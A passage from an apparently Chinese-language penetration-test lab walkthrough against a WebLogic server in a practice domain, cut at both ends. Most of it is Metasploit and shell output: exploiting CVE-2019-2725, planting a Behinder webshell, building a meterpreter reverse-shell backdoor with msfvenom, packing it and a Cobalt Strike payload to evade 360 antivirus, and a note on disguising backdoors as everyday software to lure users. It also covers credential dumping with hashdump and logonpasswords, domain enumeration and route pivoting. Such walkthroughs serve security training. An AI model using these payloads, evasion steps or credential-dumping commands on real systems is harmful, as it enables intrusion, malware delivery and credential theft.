<span class="line">  http://www.cnvd.org.cn/webinfo/show/4999</span>
<span class="line">  https://www.oracle.com/technetwork/security-advisory/alert-cve-2019-2725-5466295.html</span>
<span class="line">  https://twitter.com/F5Labs/status/1120822404568244224</span>
<span class="line"></span>
<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><div class="language-bash line-numbers-mode" data-highlighter="prismjs" data-ext="sh" data-title="sh"><pre><code><span class="line">msf6 exploit<span class="token punctuation">(</span>multi/misc/weblogic_deserialize_asyncresponseservice<span class="token punctuation">)</span> <span class="token operator">&gt;</span> <span class="token builtin class-name">set</span> rhosts <span class="token number">192.168</span>.111.80</span>
<span class="line">rhosts <span class="token operator">=</span><span class="token operator">&gt;</span> <span class="token number">192.168</span>.111.80</span>
<span class="line">msf6 exploit<span class="token punctuation">(</span>multi/misc/weblogic_deserialize_asyncresponseservice<span class="token punctuation">)</span> <span class="token operator">&gt;</span> <span class="token builtin class-name">set</span> lhost <span class="token number">192.168</span>.111.128</span>
<span class="line">lhost <span class="token operator">=</span><span class="token operator">&gt;</span> <span class="token number">192.168</span>.111.128</span>
<span class="line">msf6 exploit<span class="token punctuation">(</span>multi/misc/weblogic_deserialize_asyncresponseservice<span class="token punctuation">)</span> <span class="token operator">&gt;</span> <span class="token builtin class-name">set</span> target Windows</span>
<span class="line">target <span class="token operator">=</span><span class="token operator">&gt;</span> Windows</span>
<span class="line">msf6 exploit<span class="token punctuation">(</span>multi/misc/weblogic_deserialize_asyncresponseservice<span class="token punctuation">)</span> <span class="token operator">&gt;</span> options </span>
<span class="line"></span>
<span class="line">Module options <span class="token punctuation">(</span>exploit/multi/misc/weblogic_deserialize_asyncresponseservice<span class="token punctuation">)</span>:</span>
<span class="line"></span>
<span class="line">   Name       Current Setting               Required  Description</span>
<span class="line">   ----       ---------------               --------  -----------</span>
<span class="line">   Proxies                                  no        A proxy chain of <span class="token function">format</span> type:host:port<span class="token punctuation">[</span>,type:host:port<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">..</span>.<span class="token punctuation">]</span></span>
<span class="line">   RHOSTS     <span class="token number">192.168</span>.111.80                <span class="token function">yes</span>       The target host<span class="token punctuation">(</span>s<span class="token punctuation">)</span>, see https://github.com/rapid7/metasploit-framework/wiki/U</span>
<span class="line">                                                      sing-Metasploit</span>
<span class="line">   RPORT      <span class="token number">7001</span>                          <span class="token function">yes</span>       The target port <span class="token punctuation">(</span>TCP<span class="token punctuation">)</span></span>
<span class="line">   SSL        <span class="token boolean">false</span>                         no        Negotiate SSL/TLS <span class="token keyword">for</span> outgoing connections</span>
<span class="line">   TARGETURI  /_async/AsyncResponseService  <span class="token function">yes</span>       URL to AsyncResponseService</span>
<span class="line">   VHOST                                    no        HTTP server virtual <span class="token function">host</span></span>
<span class="line"></span>
<span class="line"></span>
<span class="line">Payload options <span class="token punctuation">(</span>windows/meterpreter/reverse_tcp<span class="token punctuation">)</span>:</span>
<span class="line"></span>
<span class="line">   Name      Current Setting  Required  Description</span>
<span class="line">   ----      ---------------  --------  -----------</span>
<span class="line">   EXITFUNC  process          <span class="token function">yes</span>       Exit technique <span class="token punctuation">(</span>Accepted: <span class="token string">&#39;&#39;</span>, seh, thread, process, none<span class="token punctuation">)</span></span>
<span class="line">   LHOST     <span class="token number">192.168</span>.111.128  <span class="token function">yes</span>       The listen address <span class="token punctuation">(</span>an interface may be specified<span class="token punctuation">)</span></span>
<span class="line">   LPORT     <span class="token number">4444</span>             <span class="token function">yes</span>       The listen port</span>
<span class="line"></span>
<span class="line"></span>
<span class="line">Exploit target:</span>
<span class="line"></span>
<span class="line">   Id  Name</span>
<span class="line">   --  ----</span>
<span class="line">   <span class="token number">1</span>   Windows</span>
<span class="line"></span>
<span class="line"></span>
<span class="line">msf6 exploit<span class="token punctuation">(</span>multi/misc/weblogic_deserialize_asyncresponseservice<span class="token punctuation">)</span> <span class="token operator">&gt;</span> run</span>
<span class="line"></span>
<span class="line"><span class="token punctuation">[</span>*<span class="token punctuation">]</span> Started reverse TCP handler on <span class="token number">192.168</span>.111.128:4444 </span>
<span class="line"><span class="token punctuation">[</span>*<span class="token punctuation">]</span> Generating payload<span class="token punctuation">..</span>.</span>
<span class="line"><span class="token punctuation">[</span>*<span class="token punctuation">]</span> Sending payload<span class="token punctuation">..</span>.</span>
<span class="line"><span class="token punctuation">[</span>*<span class="token punctuation">]</span> Exploit completed, but no session was created.</span>
<span class="line"></span>
<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>失败，360 拦下来了</p><p><img src="`+R+'" alt="image-20220904160410608"></p><h4 id="漏洞-webshell" tabindex="-1"><a class="header-anchor" href="#漏洞-webshell"><span>漏洞 WebShell</span></a></h4><h5 id="java反序列化漏洞利用工具-冰蝎-反弹-shell" tabindex="-1"><a class="header-anchor" href="#java反序列化漏洞利用工具-冰蝎-反弹-shell"><span>Java反序列化漏洞利用工具 + 冰蝎 反弹 Shell</span></a></h5><p>tasklist 发现 360</p><p><img src="'+A+'" alt="image-20220904163431356"></p><p><img src="'+P+'" alt="image-20220904163651371"></p>',32)),n("p",null,[s[4]||(s[4]=a("将 ")),n("a",ss,[s[3]||(s[3]=a("冰蝎")),p(e)]),s[5]||(s[5]=a(" 的Server传上WEB"))]),n("blockquote",null,[n("p",null,[s[7]||(s[7]=a("Requset ")),n("a",ns,[s[6]||(s[6]=a("JRE")),p(e)]),s[8]||(s[8]=a(" 1.8+"))])]),s[15]||(s[15]=l('<p><img src="'+W+'" alt="image-20220905193231829"></p><p>冰蝎连接，成功：</p><p><img src="'+M+'" alt="image-20220905193450444"></p><p>看看系统信息</p><p><img src="'+q+'" alt="image-20220906012948157"></p><p>Shell 也返回成功了</p><p><img src="'+V+`" alt="image-20220906013521880"></p><h5 id="msf-反弹-shell" tabindex="-1"><a class="header-anchor" href="#msf-反弹-shell"><span>MSF 反弹 Shell</span></a></h5><p>生成 PHP 后门</p><div class="language-php line-numbers-mode" data-highlighter="prismjs" data-ext="php" data-title="php"><pre><code><span class="line">┌──<span class="token punctuation">(</span>root㉿kali<span class="token punctuation">)</span><span class="token operator">-</span><span class="token punctuation">[</span><span class="token operator">/</span>home<span class="token operator">/</span>kali<span class="token punctuation">]</span></span>
<span class="line">└─<span class="token comment"># msfvenom -p php/meterpreter/reverse_tcp lhost=192.168.111.128 lport=9999 -f raw &gt;houmen.php                              </span></span>
<span class="line"><span class="token punctuation">[</span><span class="token operator">-</span><span class="token punctuation">]</span> No platform was selected<span class="token punctuation">,</span> choosing <span class="token class-name static-context">Msf</span><span class="token operator">::</span><span class="token class-name static-context">Module</span><span class="token operator">::</span><span class="token class-name static-context">Platform</span><span class="token operator">::</span><span class="token constant">PHP</span> from the payload</span>
<span class="line"><span class="token punctuation">[</span><span class="token operator">-</span><span class="token punctuation">]</span> No arch selected<span class="token punctuation">,</span> selecting arch<span class="token punctuation">:</span> php from the payload</span>
<span class="line">No encoder specified<span class="token punctuation">,</span> outputting raw payload</span>
<span class="line">Payload size<span class="token punctuation">:</span> <span class="token number">1116</span> bytes</span>
<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p><img src="`+N+'" alt="image-20220906013850233"></p><p>构造免杀</p>',12)),n("p",null,[s[10]||(s[10]=a("工具：")),n("a",as,[s[9]||(s[9]=a("Release bamcompile1.21.zip · xZero707/Bamcompile (github.com)")),p(e)])]),s[16]||(s[16]=l(`<div class="language-powershell line-numbers-mode" data-highlighter="prismjs" data-ext="powershell" data-title="powershell"><pre><code><span class="line"><span class="token function">PS</span> D:\\ProgramOthers\\Security\\bamcompile1<span class="token punctuation">.</span>21&gt; <span class="token punctuation">.</span>\\bamcompile<span class="token punctuation">.</span>exe <span class="token operator">-</span>w <span class="token operator">-</span>c <span class="token punctuation">.</span>\\houmen<span class="token punctuation">.</span>php <span class="token punctuation">.</span>\\miansha<span class="token punctuation">.</span>exe</span>
<span class="line"></span>
<span class="line">Bambalam PHP EXE Compiler/Embedder 1<span class="token punctuation">.</span>21</span>
<span class="line"></span>
<span class="line">Windowed application</span>
<span class="line">Compress</span>
<span class="line">Mainfile: <span class="token punctuation">.</span>\\houmen<span class="token punctuation">.</span>php</span>
<span class="line">Outfile: <span class="token punctuation">.</span>\\miansha<span class="token punctuation">.</span>exe</span>
<span class="line"></span>
<span class="line">Encoding and embedding <span class="token punctuation">.</span>\\houmen<span class="token punctuation">.</span>php</span>
<span class="line">Compressing final exe<span class="token punctuation">.</span><span class="token punctuation">.</span></span>
<span class="line">Compression done</span>
<span class="line"></span>
<span class="line"><span class="token punctuation">.</span>\\miansha<span class="token punctuation">.</span>exe created successfully!</span>
<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>得到免杀 EXE</p><p><img src="`+O+`" alt="image-20220906014757932"></p><p>将其上传到 WEB 中，然后开启监听，运行miasha.exe，成功反弹</p><div class="language-bash line-numbers-mode" data-highlighter="prismjs" data-ext="sh" data-title="sh"><pre><code><span class="line">msf6 <span class="token operator">&gt;</span> use exploit/multi/handler </span>
<span class="line"><span class="token punctuation">[</span>*<span class="token punctuation">]</span> Using configured payload generic/shell_reverse_tcp</span>
<span class="line">msf6 exploit<span class="token punctuation">(</span>multi/handler<span class="token punctuation">)</span> <span class="token operator">&gt;</span> options </span>
<span class="line"></span>
<span class="line">Module options <span class="token punctuation">(</span>exploit/multi/handler<span class="token punctuation">)</span>:</span>
<span class="line"></span>
<span class="line">   Name  Current Setting  Required  Description</span>
<span class="line">   ----  ---------------  --------  -----------</span>
<span class="line"></span>
<span class="line"></span>
<span class="line">Payload options <span class="token punctuation">(</span>generic/shell_reverse_tcp<span class="token punctuation">)</span>:</span>
<span class="line"></span>
<span class="line">   Name   Current Setting  Required  Description</span>
<span class="line">   ----   ---------------  --------  -----------</span>
<span class="line">   LHOST                   <span class="token function">yes</span>       The listen address <span class="token punctuation">(</span>an interface may be specified<span class="token punctuation">)</span></span>
<span class="line">   LPORT  <span class="token number">4444</span>             <span class="token function">yes</span>       The listen port</span>
<span class="line"></span>
<span class="line"></span>
<span class="line">Exploit target:</span>
<span class="line"></span>
<span class="line">   Id  Name</span>
<span class="line">   --  ----</span>
<span class="line">   <span class="token number">0</span>   Wildcard Target</span>
<span class="line"></span>
<span class="line"></span>
<span class="line">msf6 exploit<span class="token punctuation">(</span>multi/handler<span class="token punctuation">)</span> <span class="token operator">&gt;</span> <span class="token builtin class-name">set</span> lhost <span class="token number">192.168</span>.111.128</span>
<span class="line">lhost <span class="token operator">=</span><span class="token operator">&gt;</span> <span class="token number">192.168</span>.111.128</span>
<span class="line">msf6 exploit<span class="token punctuation">(</span>multi/handler<span class="token punctuation">)</span> <span class="token operator">&gt;</span> <span class="token builtin class-name">set</span> lport <span class="token number">9999</span></span>
<span class="line">lport <span class="token operator">=</span><span class="token operator">&gt;</span> <span class="token number">9999</span></span>
<span class="line">msf6 exploit<span class="token punctuation">(</span>multi/handler<span class="token punctuation">)</span> <span class="token operator">&gt;</span> <span class="token builtin class-name">set</span> payload php/meterpreter/reverse_tcp</span>
<span class="line">payload <span class="token operator">=</span><span class="token operator">&gt;</span> php/meterpreter/reverse_tcp</span>
<span class="line">msf6 exploit<span class="token punctuation">(</span>multi/handler<span class="token punctuation">)</span> <span class="token operator">&gt;</span> run</span>
<span class="line"></span>
<span class="line"><span class="token punctuation">[</span>*<span class="token punctuation">]</span> Started reverse TCP handler on <span class="token number">192.168</span>.111.128:9999 </span>
<span class="line"><span class="token punctuation">[</span>*<span class="token punctuation">]</span> Sending stage <span class="token punctuation">(</span><span class="token number">39282</span> bytes<span class="token punctuation">)</span> to <span class="token number">192.168</span>.111.80</span>
<span class="line"><span class="token punctuation">[</span>*<span class="token punctuation">]</span> Meterpreter session <span class="token number">3</span> opened <span class="token punctuation">(</span><span class="token number">192.168</span>.111.128:9999 -<span class="token operator">&gt;</span> <span class="token number">192.168</span>.111.80:53897 <span class="token punctuation">)</span> at <span class="token number">2022</span>-09-05 <span class="token number">13</span>:54:37 <span class="token parameter variable">-0400</span></span>
<span class="line"></span>
<span class="line">meterpreter <span class="token operator">&gt;</span></span>
<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h5 id="cs" tabindex="-1"><a class="header-anchor" href="#cs"><span>CS</span></a></h5><p>新建监听器</p><p><img src="`+I+'" alt="image-20220906235842928"></p><p>生成后门</p><p><img src="'+B+'" alt="image-20220906155511478"></p><p>上传后门</p><p><img src="'+j+'" alt="image-20220906235950361"></p><p><s>怪了这360怎么一点反应都没有</s></p><p>运行起来就有反应了</p><p><img src="'+z+'" alt="image-20220907000127567"></p><p>用 BypassAV, Restorator，再加壳，手动云查杀一下看看结果：</p><p><img src="'+U+'" alt="image-20220907153445579"></p><p>试了几种方法，得出了个不知道严不严谨的结论</p><blockquote><p>后门得用户自己打开才行（不会报毒）</p><p>远程执行就算是绕着几个弯也还是会报入侵服务器</p></blockquote><p>那就暂时先模拟诱惑用户主动点击吧，毕竟可以伪造成日用软件。（当然，也可以用 MSF 派生 CS Shell）</p><p>双击打开 云查杀也不报毒的 artifact1.exe</p><p>成功反弹</p><p><img src="'+F+'" alt="image-20220907155321492"></p><p>提权</p><p><img src="'+L+`" alt="image-20220907162927468"></p><h3 id="信息收集-1" tabindex="-1"><a class="header-anchor" href="#信息收集-1"><span>信息收集</span></a></h3><h4 id="抓取明文密码" tabindex="-1"><a class="header-anchor" href="#抓取明文密码"><span>抓取明文密码</span></a></h4><div class="language-text line-numbers-mode" data-highlighter="prismjs" data-ext="text" data-title="text"><pre><code><span class="line">hashdump</span>
<span class="line">logonpasswords</span>
<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div></div></div><p><img src="`+H+'" alt="image-20220907163238560"></p><h4 id="主机信息" tabindex="-1"><a class="header-anchor" href="#主机信息"><span>主机信息</span></a></h4><blockquote><p>常用命令</p><p>systeminfo //查看操作系统信息 ipconfig /all //查询本机ip段，所在域等 whoami //查看当前用户权限 net user //查看本地用户 net localgroup administrators //查看本地管理员组(通常 包含域用户)</p></blockquote><p>系统信息</p><p><img src="'+K+'" alt="image-20220908182619727"></p><p>IP 信息</p><p><img src="'+G+'" alt="image-20220908183702411"></p><p>两个网络</p><blockquote><p>192.168.111.80</p><p>10.10.10.80</p></blockquote><p>还是 MSF 用着顺手，用冰蝎反弹 Shell 过去</p><p><img src="'+Y+`" alt="image-20220908184546973"></p><h4 id="域信息收集" tabindex="-1"><a class="header-anchor" href="#域信息收集"><span>域信息收集</span></a></h4><blockquote><p>常用命令：</p><p>net config workstation // 查看当前计算机名，全名，用户名，系统版本，工作站域，登陆的域等 net view /domain // 查看域 net time /domain // 主域服务器会同时作为时间服务器 net user /domain // 查看域用户 net group /domain // 查看域内用户组列表 net group &quot;domain computers&quot; /domain // 查看域内的机器 net group &quot;domain controllers&quot; /domain // 查看域控制器组 net group &quot;Enterprise Admins&quot; /domain // 查看域管理员组</p></blockquote><p>域配置</p><div class="language-bash line-numbers-mode" data-highlighter="prismjs" data-ext="sh" data-title="sh"><pre><code><span class="line">c:<span class="token punctuation">\\</span><span class="token operator">&gt;</span>net config workstation</span>
<span class="line">net config workstation</span>
<span class="line">Computer name                        <span class="token punctuation">\\</span><span class="token punctuation">\\</span>WEB</span>
<span class="line">Full Computer name                   WEB.de1ay.com</span>
<span class="line">User name                            de1ay</span>
<span class="line"></span>
<span class="line">Workstation active on                </span>
<span class="line">        NetBT_Tcpip_<span class="token punctuation">{</span>D7E14072-49B9-45D3-BA8C-7955E6146CC2<span class="token punctuation">}</span> <span class="token punctuation">(</span>000C295A92F5<span class="token punctuation">)</span></span>
<span class="line">        NetBT_Tcpip_<span class="token punctuation">{</span>AD80CD23-D97F-4814-A715-9248D845EA0F<span class="token punctuation">}</span> <span class="token punctuation">(</span>000C295A92FF<span class="token punctuation">)</span></span>
<span class="line"></span>
<span class="line">Software version                     Windows Server <span class="token number">2008</span> R2 Standard</span>
<span class="line"></span>
<span class="line">Workstation domain                   DE1AY</span>
<span class="line">Workstation Domain DNS Name          de1ay.com</span>
<span class="line">Logon domain                         WEB</span>
<span class="line"></span>
<span class="line">COM Open Timeout <span class="token punctuation">(</span>sec<span class="token punctuation">)</span>               <span class="token number">0</span></span>
<span class="line">COM Send Count <span class="token punctuation">(</span>byte<span class="token punctuation">)</span>                <span class="token number">32</span></span>
<span class="line">COM Send Timeout <span class="token punctuation">(</span>msec<span class="token punctuation">)</span>              <span class="token number">250</span></span>
<span class="line">The <span class="token builtin class-name">command</span> completed successfully.</span>
<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>域内用户组</p><div class="language-bash line-numbers-mode" data-highlighter="prismjs" data-ext="sh" data-title="sh"><pre><code><span class="line">C:<span class="token punctuation">\\</span><span class="token operator">&gt;</span>net group /domain</span>
<span class="line">net group /domain</span>
<span class="line">The request will be processed at a domain controller <span class="token keyword">for</span> domain de1ay.com.</span>
<span class="line"></span>
<span class="line"></span>
<span class="line">Group Accounts <span class="token keyword">for</span> <span class="token punctuation">\\</span><span class="token punctuation">\\</span>DC.de1ay.com</span>
<span class="line"></span>
<span class="line">-------------------------------------------------------------------------------</span>
<span class="line">*Cloneable Domain Controllers</span>
<span class="line">*DnsUpdateProxy</span>
<span class="line">*Domain Admins</span>
<span class="line">*Domain Computers</span>
<span class="line">*Domain Controllers</span>
<span class="line">*Domain Guests</span>
<span class="line">*Domain Users</span>
<span class="line">*Enterprise Admins</span>
<span class="line">*Enterprise Read-only Domain Controllers</span>
<span class="line">*Group Policy Creator Owners</span>
<span class="line">*Protected Users</span>
<span class="line">*Read-only Domain Controllers</span>
<span class="line">*Schema Admins</span>
<span class="line">The <span class="token builtin class-name">command</span> completed successfully.</span>
<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>域用户</p><div class="language-bash line-numbers-mode" data-highlighter="prismjs" data-ext="sh" data-title="sh"><pre><code><span class="line">C:<span class="token punctuation">\\</span><span class="token operator">&gt;</span>net user /domain</span>
<span class="line">net user /domain</span>
<span class="line">The request will be processed at a domain controller <span class="token keyword">for</span> domain de1ay.com.</span>
<span class="line"></span>
<span class="line"></span>
<span class="line">User accounts <span class="token keyword">for</span> <span class="token punctuation">\\</span><span class="token punctuation">\\</span>DC.de1ay.com</span>
<span class="line"></span>
<span class="line">-------------------------------------------------------------------------------</span>
<span class="line">Administrator            de1ay                    Guest                    </span>
<span class="line">krbtgt                   mssql                    </span>
<span class="line">The <span class="token builtin class-name">command</span> completed successfully.</span>
<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>域内机器</p><div class="language-bash line-numbers-mode" data-highlighter="prismjs" data-ext="sh" data-title="sh"><pre><code><span class="line">C:<span class="token punctuation">\\</span><span class="token operator">&gt;</span>net group <span class="token string">&quot;domain computers&quot;</span> /domain</span>
<span class="line">net group <span class="token string">&quot;domain computers&quot;</span> /domain</span>
<span class="line">The request will be processed at a domain controller <span class="token keyword">for</span> domain de1ay.com.</span>
<span class="line"></span>
<span class="line">Group name     Domain Computers</span>
<span class="line">Comment        ���뵽���е����й���վ�ͷ�����</span>
<span class="line"></span>
<span class="line">Members</span>
<span class="line"></span>
<span class="line">-------------------------------------------------------------------------------</span>
<span class="line">PC$                      WEB$                     </span>
<span class="line">The <span class="token builtin class-name">command</span> completed successfully.</span>
<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><blockquote><p>PC</p><p>WEB</p></blockquote><p>域控</p><div class="language-bash line-numbers-mode" data-highlighter="prismjs" data-ext="sh" data-title="sh"><pre><code><span class="line">C:<span class="token punctuation">\\</span><span class="token operator">&gt;</span>net group <span class="token string">&quot;domain controllers&quot;</span> /domain</span>
<span class="line">net group <span class="token string">&quot;domain controllers&quot;</span> /domain</span>
<span class="line">The request will be processed at a domain controller <span class="token keyword">for</span> domain de1ay.com.</span>
<span class="line"></span>
<span class="line">Group name     Domain Controllers</span>
<span class="line">Comment        ����������������</span>
<span class="line"></span>
<span class="line">Members</span>
<span class="line"></span>
<span class="line">-------------------------------------------------------------------------------</span>
<span class="line">DC$                      </span>
<span class="line">The <span class="token builtin class-name">command</span> completed successfully.</span>
<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><blockquote><p>DC</p></blockquote><h3 id="横向移动" tabindex="-1"><a class="header-anchor" href="#横向移动"><span>横向移动</span></a></h3><h4 id="设置代理" tabindex="-1"><a class="header-anchor" href="#设置代理"><span>设置代理</span></a></h4><blockquote><p>确保已在 MSF 中 get shell</p></blockquote><p>添加路由</p><blockquote><p>手工添加：run autoroute -s 192.168.52.0/24 #添加路由 run autoroute -p #查看路由 自动添加：run post/multi/manage/autoroute</p></blockquote><blockquote><p>查看路由表：run autoroute -p</p></blockquote><p>自动添加失败：</p><div class="language-bash line-numbers-mode" data-highlighter="prismjs" data-ext="sh" data-title="sh"><pre><code><span class="line">meterpreter <span class="token operator">&gt;</span> run post/multi/manage/autoroute</span>
<span class="line"></span>
<span class="line"><span class="token punctuation">[</span><span class="token operator">!</span><span class="token punctuation">]</span> <span class="token environment constant">SESSION</span> may not be compatible with this module:</span>
<span class="line"><span class="token punctuation">[</span><span class="token operator">!</span><span class="token punctuation">]</span>  * incompatible session platform: windows</span>
<span class="line"><span class="token punctuation">[</span>*<span class="token punctuation">]</span> Running module against WEB</span>
<span class="line"><span class="token punctuation">[</span>*<span class="token punctuation">]</span> Searching <span class="token keyword">for</span> subnets to autoroute.</span>
<span class="line"><span class="token punctuation">[</span>*<span class="token punctuation">]</span> Did not <span class="token function">find</span> any new subnets to add.</span>
<span class="line">meterpreter <span class="token operator">&gt;</span> run autoroute <span class="token parameter variable">-p</span></span>
<span class="line"></span>
<span class="line"><span class="token punctuation">[</span><span class="token operator">!</span><span class="token punctuation">]</span> Meterpreter scripts are deprecated. Try post/multi/manage/autoroute.</span>
<span class="line"><span class="token punctuation">[</span><span class="token operator">!</span><span class="token punctuation">]</span> Example: run post/multi/manage/autoroute <span class="token assign-left variable">OPTION</span><span class="token operator">=</span>value <span class="token punctuation">[</span><span class="token punctuation">..</span>.<span class="token punctuation">]</span></span>
<span class="line"><span class="token punctuation">[</span>*<span class="token punctuation">]</span> No routes have been added yet</span>
<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>手动添加</p><div class="language-bash line-numbers-mode" data-highlighter="prismjs" data-ext="sh" data-title="sh"><pre><code><span class="line">meterpreter <span class="token operator">&gt;</span> run autoroute <span class="token parameter variable">-s</span> <span class="token number">10.10</span>.10.0/24</span>
<span class="line"></span>
<span class="line"><span class="token punctuation">[</span><span class="token operator">!</span><span class="token punctuation">]</span> Meterpreter scripts are deprecated. Try post/multi/manage/autoroute.</span>
<span class="line"><span class="token punctuation">[</span><span class="token operator">!</span><span class="token punctuation">]</span> Example: run post/multi/manage/autoroute <span class="token assign-left variable">OPTION</span><span class="token operator">=</span>value <span class="token punctuation">[</span><span class="token punctuation">..</span>.<span class="token punctuation">]</span></span>
<span class="line"><span class="token punctuation">[</span>*<span class="token punctuation">]</span> Adding a route to <span class="token number">10.10</span>.10.0/255.255.255.0<span class="token punctuation">..</span>.</span>
<span class="line"><span class="token punctuation">[</span>+<span class="token punctuation">]</span> Added route to <span class="token number">10.10</span>.10.0/255.255.255.0 via <span class="token number">192.168</span>.111.80</span>
<span class="line"><span class="token punctuation">[</span>*<span class="token punctuation">]</span> Use the <span class="token parameter variable">-p</span> option to list all active routes</span>
<span class="line">meterpreter <span class="token operator">&gt;</span> run autoroute <span class="token parameter variable">-p</span></span>
<span class="line"></span>
<span class="line"><span class="token punctuation">[</span><span class="token operator">!</span><span class="token punctuation">]</span> Meterpreter scripts are deprecated. Try post/multi/manage/autoroute.</span>
